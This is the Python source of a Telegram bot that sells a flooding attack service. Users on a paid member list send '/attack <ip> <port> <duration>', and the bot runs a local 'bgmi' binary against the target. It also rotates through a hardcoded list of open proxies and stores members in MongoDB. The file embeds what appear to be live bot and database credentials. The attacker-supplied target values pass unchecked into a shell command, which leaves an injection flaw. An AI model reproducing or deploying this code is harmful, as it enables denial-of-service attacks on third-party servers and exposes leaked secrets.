import telebot
import logging
import time
from pymongo import MongoClient
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7413939340:AAHF0QYMvYbZoa5ww38iVIKbpU9-BXdYlVg'
MONGO_URI = 'mongodb+srv://piroop:piroop@piro.hexrg9w.mongodb.net/?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
CHANNEL_ID = -1002159583778

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users_new

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

admins = ['IRFANSARI0']
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 900")
    await process.communicate()

def is_user_admin(user_id):
    try:
        return user_id in admins
    except:
        return False

@bot.message_handler(commands=['add', 'remove'])
def add_or_remove_user(message):
    user_id = message.from_user.username
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Invalid command format. Use /add <user_id> or /remove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = cmd_parts[1][1:]

    if action == '/add':
        users_collection.insert_one({
            "user_id": target_user_id
        })
        msg_text = f"*User @{target_user_id} added.*"
    else:  # Remove
        users_collection.delete_one({
            "user_id": target_user_id
        })
        msg_text = f"*User @{target_user_id} removed.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.username
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator. - @IRFANSARI0*", parse_mode='Markdown')
            return
        
        try:
            args = message.text.split()
            if len(args) != 4:
                bot.send_message(message.chat.id, "*Wrong Input, Try Again... \n\n/attack <ip> <port> <duration(sec)>\n\ne.g. /attack 2.2.2.2 13888 600*", parse_mode='Markdown')
                return
            _, target_ip, target_port, duration = args[0], args[1], int(args[2]), int(args[3])

            if target_port in blocked_ports:
                bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
                return

            asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
            bot.send_message(message.chat.id, f"*😍 Attack started 😍\n\n👉Host: {target_ip}\n👉Port: {target_port}\n👉Time: {duration}*", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Error in processing attack command: {e}")
        
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['members'])
def get_all_members_info(message):
    user_id = message.from_user.username
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id)

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) > 1:
        member_id = cmd_parts[1][1:]
        member_data = users_collection.find_one({"user_id": member_id})
        if member_data:
            bot.send_message(chat_id, f"*@{member_id} is a member.*", parse_mode='Markdown')
            return
        else:
            bot.send_message(chat_id, f"*No member found with user_id @{member_id}.*", parse_mode='Markdown')
            return
    else:
        result = list(users_collection.find({}, {'user_id': 1}))

        all_member_names = "Here is the list of all the members -\n"
        for doc in result:
            all_member_names += "@" + doc['user_id'] + "\n"
        
        bot.send_message(chat_id, all_member_names, parse_mode='Markdown')
        return

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Attack")
    btn2 = KeyboardButton("My Account 🏦")
    btn3 = KeyboardButton("Contact Admin ✔️")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "":
        bot.reply_to(message, "**", parse_mode='Markdown')
    elif message.text == "Attack":
        attack_command(message)
    elif message.text in ["My Account 🏦", "/myinfo"]:
        user_id = message.from_user.username
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            response = "*Cogratulations, you are a member. - @IRFANSARI0*"
        else:
            response = "*Not a member. Buy - @IRFANSARI0*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "/help":
        bot.reply_to(message, "*/attack <ip> <port> <duration>*", parse_mode='Markdown')
    elif message.text in ["Contact Admin ✔️", "/owner", "/admin"]:
        bot.reply_to(message, "*Owner & Admin - @IRFANSARI0*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)